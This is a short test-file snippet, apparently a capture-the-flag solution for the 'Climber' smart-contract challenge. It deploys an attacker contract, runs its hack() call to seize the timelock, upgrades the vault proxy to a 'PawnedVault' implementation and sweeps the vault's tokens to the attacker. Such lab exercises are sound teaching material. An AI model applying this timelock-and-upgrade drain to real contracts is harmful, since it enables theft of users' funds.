...
describe('[Challenge] Climber', function () {
    ...
    it('Exploit', async function () {
        ...
        const climberHackFactory = await ethers.getContractFactory("ClimberHack", attacker);
        this.climberHack = await climberHackFactory.deploy(attacker.address, this.timelock.address, this.vault.address);

        const newVaultFactory = await ethers.getContractFactory("PawnedVault", attacker);
        // this.newVault = await newVaultFactory.deploy();

        await this.climberHack.connect(attacker).hack();

        const newVault = await upgrades.upgradeProxy(this.vault.address, newVaultFactory);

        await newVault.connect(attacker).sweepFunds(this.token.address);
    });
